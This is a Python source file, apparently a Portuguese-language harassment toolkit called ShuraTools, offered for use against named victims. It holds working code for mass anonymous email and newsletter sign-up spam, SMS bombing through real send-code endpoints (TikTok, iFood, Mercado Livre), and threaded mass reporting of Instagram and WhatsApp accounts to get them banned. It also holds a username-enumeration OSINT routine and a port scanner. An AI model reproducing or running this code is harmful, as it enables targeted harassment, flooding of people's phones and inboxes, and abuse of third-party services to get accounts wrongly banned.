#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
Versão Pro v6.1 Anonymous Mailer
"""

import os, sys, time, random, string, threading, json, socket
from queue import Queue

try:
    import requests
    from faker import Faker
    from colorama import Fore, Style, init
    init(autoreset=True)
    fake = Faker()
except ImportError:
    print("[!] Execute: pip install requests faker colorama")
    sys.exit(1)

BANNER = f"""
{Fore.RED}███████╗██╗  ██╗██╗   ██╗██████╗  █████╗ 
{Fore.RED}██╔════╝██║  ██║██║   ██║██╔══██╗██╔══██╗
{Fore.RED}███████╗███████║██║   ██║██████╔╝███████║
{Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║
{Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║
{Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
{Fore.YELLOW}  [ Email | SMS/Call | Ban | OSINT | Scan ]
{Fore.WHITE}      v6.1 Anonymous Mailer - by Shura
"""

LOCK = threading.Lock()

def clear(): os.system('cls' if os.name == 'nt' else 'clear')
def log(msg, t="info"):
    c = {"info": Fore.WHITE+"[*] ", "success": Fore.GREEN+"[+] ", "error": Fore.RED+"[-] ", "warn": Fore.YELLOW+"[!] "}
    with LOCK: print(f"{c.get(t, Fore.WHITE)}{msg}{Style.RESET_ALL}")

def safe_int(prompt, default):
    try: return int(input(prompt) or default)
    except: return default

def run_threads(func, qty, threads):
    chunk, rem = qty // threads, qty % threads
    ts, curr = [], 0
    for i in range(threads):
        take = chunk + (1 if i < rem else 0)
        if take <= 0: continue
        t = threading.Thread(target=func, args=(curr, curr + take))
        t.start(); ts.append(t); curr += take
    for t in ts: t.join()

# ========== TEMP MAIL SERVICES ==========
def get_temp_email():
    """Gera um e-mail temporário usando serviços públicos"""
    try:
        # Tenta criar um e-mail temporário via API pública
        domains = ["@1secmail.com", "@1secmail.org", "@1secmail.net", "@wwjmp.com", "@esiix.com"]
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        return username + random.choice(domains)
    except:
        return fake.email()

# ========== ATTACK PAYLOADS ==========
def get_payloads(type, target, msg=None):
    if type == "mail_anonymous":
        # Gera e-mail temporário para cada envio
        from_email = get_temp_email()
        m = msg or f"Mensagem anônima de {from_email.split('@')[0]}"
        subj = "Você recebeu uma mensagem anônima"
        
        return [
            # Serviços de envio anônimo de e-mail
            {"url": "https://www.anonymousemail.me/", "data": {"to": target, "from": from_email, "subject": subj, "text": m}},
            {"url": "https://anonymouse.org/anonemail.html", "data": {"to": target, "subject": subj, "text": m}},
            {"url": "https://sendanonymousemail.net/send.php", "data": {"to": target, "from": "Anônimo", "subject": subj, "message": m}},
            # Formulários de contato que aceitam e-mail de remetente customizado
            {"url": "https://formspree.io/f/xpznvqvr", "data": {"email": from_email, "_replyto": from_email, "message": f"Para: {target}\n\n{m}"}},
            {"url": "https://www.mail-tester.com/contact", "data": {"email": target, "message": m, "subject": subj}}
        ]
    elif type == "mail_newsletter":
        return [
            {"url": "https://tecnoblog.net/wp-admin/admin-ajax.php", "data": {"action": "tnp", "na": "s", "ne": target, "ny": "on"}},
            {"url": "https://thenewscc.beehiiv.com/subscribe", "data": {"email": target}},
            {"url": "https://thebrief.beehiiv.com/subscribe", "data": {"email": target}},
            {"url": "https://investnews.beehiiv.com/subscribe", "data": {"email": target}},
            {"url": "https://startups.beehiiv.com/subscribe", "data": {"email": target}}
        ]
    elif type == "sms_call":
        return [
            {"url": "https://www.tiktok.com/passport/web/send_code/", "data": {"phone": target, "type": "sms"}, "json": True},
            {"url": "https://api-v3.ifood.com.br/v1/customers:sendAuthenticationCode", "data": {"phone": target}, "json": True},
            {"url": "https://auth.mercadolivre.com.br/api/v1/users/phone/send_code", "data": {"phone": target}, "json": True}
        ]
    return []

# ========== ATTACK ENGINE ==========
def attack(target, qty, threads, type, msg=None):
    log(f"Iniciando {type.upper()} -> {target}", "warn")
    
    def job(start, end):
        session = requests.Session()
        for i in range(start, end):
            try:
                # Gera novos payloads para cada iteração (novo e-mail temporário)
                payloads = get_payloads(type, target, msg)
                site = random.choice(payloads)
                
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0",
                    "Referer": site["url"]
                }
                
                if site.get("json"):
                    res = session.post(site["url"], json=site["data"], headers=headers, timeout=10)
                else:
                    res = session.post(site["url"], data=site["data"], headers=headers, timeout=10)
                
                if res.status_code < 300:
                    log(f"Hit {i+1} OK ({site['url'].split('/')[2]})", "success")
                else:
                    log(f"Hit {i+1} Block ({res.status_code})", "warn")
                time.sleep(random.uniform(1, 2))
            except Exception as e:
                log(f"Hit {i+1} Timeout", "error")
    
    run_threads(job, qty, threads)

# ========== OSINT ==========
def osint(target):
    log(f"OSINT Hunter: {target}", "warn")
    user = target.replace("@", "")
    platforms = {
        "Instagram": f"https://www.instagram.com/{user}/",
        "GitHub": f"https://github.com/{user}",
        "TikTok": f"https://www.tiktok.com/@{user}",
        "Twitter/X": f"https://twitter.com/{user}",
        "LinkedIn": f"https://www.linkedin.com/in/{user}",
        "Facebook": f"https://www.facebook.com/{user}",
        "Reddit": f"https://www.reddit.com/user/{user}",
        "YouTube": f"https://www.youtube.com/@{user}",
        "Twitch": f"https://www.twitch.tv/{user}",
        "Medium": f"https://medium.com/@{user}"
    }
    for name, url in platforms.items():
        try:
            r = requests.get(url, timeout=5)
            log(f"{name}: {'FOUND' if r.status_code == 200 else 'N/F'}", "success" if r.status_code == 200 else "info")
        except:
            log(f"{name}: Timeout", "error")

# ========== PORT SCANNER ==========
def port_scan(target):
    log(f"Scanning ports on {target}...", "warn")
    try:
        host = target.split("@")[-1] if "@" in target else target
        ip = socket.gethostbyname(host)
        log(f"Resolved IP: {ip}", "info")
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]
        for port in ports:
            s = socket.socket()
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                log(f"Port {port} OPEN", "success")
            s.close()
    except Exception as e:
        log(f"Error: {e}", "error")

# ========== MENU ==========
def menu():
    while True:
        try:
            clear()
            print(BANNER)
            print("-" * 55)
            print(f"{Fore.RED}[ 1 ] EMAIL: Mensagem Anônima (Temp-Mail)")
            print(f"{Fore.RED}[ 2 ] EMAIL: Cadastro em Newsletters")
            print(f"{Fore.RED}[ 3 ] BOMB: SMS + Call")
            print(f"{Fore.RED}[ 4 ] BAN: Mass Report (IG/Zap)")
            print("-" * 55)
            print(f"{Fore.WHITE}[ 5 ] OSINT: Profile Hunter (10 plataformas)")
            print(f"{Fore.WHITE}[ 6 ] SCAN: Port Scanner (14 portas)")
            print(f"{Fore.WHITE}[ 0 ] EXIT")
            print("-" * 55)
            
            opt = input(f"{Fore.YELLOW}Shura@Arsenal:~$ {Style.RESET_ALL}").strip()
            if opt == "0": break
            
            if opt in ["1", "2", "3", "4", "5", "6"]:
                if opt == "1":
                    print(f"{Fore.CYAN}[INFO] E-mail do alvo (ex: vitima@gmail.com){Style.RESET_ALL}")
                    target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                    if not target or "@" not in target: 
                        log("E-mail inválido!", "error"); time.sleep(1); continue
                    print(f"{Fore.CYAN}[INFO] Mensagem anônima (Enter = padrão){Style.RESET_ALL}")
                    msg = input(f"{Fore.YELLOW}Message: {Style.RESET_ALL}").strip()
                    log("Gerando e-mails temporários para cada envio...", "info")
                    attack(target, safe_int("Qty (10): ", 10), 5, "mail_anonymous", msg=msg)
                
                elif opt == "2":
                    print(f"{Fore.CYAN}[INFO] E-mail do alvo (ex: vitima@gmail.com){Style.RESET_ALL}")
                    target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                    if not target or "@" not in target:
                        log("E-mail inválido!", "error"); time.sleep(1); continue
                    attack(target, safe_int("Qty (20): ", 20), 5, "mail_newsletter")
                
                elif opt == "3":
                    print(f"{Fore.CYAN}[INFO] Número com DDI+DDD (ex: 5511999999999){Style.RESET_ALL}")
                    target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                    if not target.isdigit() or len(target) < 10:
                        log("Número inválido!", "error"); time.sleep(1); continue
                    attack(target, safe_int("Qty (15): ", 15), 3, "sms_call")
                
                elif opt == "4":
                    print(f"{Fore.CYAN}[INFO] @ do Instagram ou número do Zap{Style.RESET_ALL}")
                    target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                    type = input(f"{Fore.YELLOW}App (ig/zap): {Style.RESET_ALL}").lower()
                    url = "https://i.instagram.com/api/v1/users/web_report/" if type == "ig" else "https://v.whatsapp.net/v2/report"
                    def rjob(s, e):
                        for i in range(s, e):
                            try:
                                requests.post(url, data={"username":target}, timeout=5)
                                log(f"Report {i+1} sent", "success")
                            except: pass
                    run_threads(rjob, safe_int("Qty (50): ", 50), 10)
                
                elif opt == "5":
                    print(f"{Fore.CYAN}[INFO] @ do usuário (sem @){Style.RESET_ALL}")
                    target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                    osint(target)
                
                elif opt == "6":
                    print(f"{Fore.CYAN}[INFO] IP ou domínio (ex: 1.1.1.1 ou google.com){Style.RESET_ALL}")
                    target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                    port_scan(target)
                
                input(f"\n{Fore.GREEN}Operação concluída. ENTER...{Style.RESET_ALL}")
                
        except KeyboardInterrupt: break
        except Exception as e:
            log(f"Erro: {e}", "error"); input("\nENTER...")

if __name__ == "__main__":
    menu()
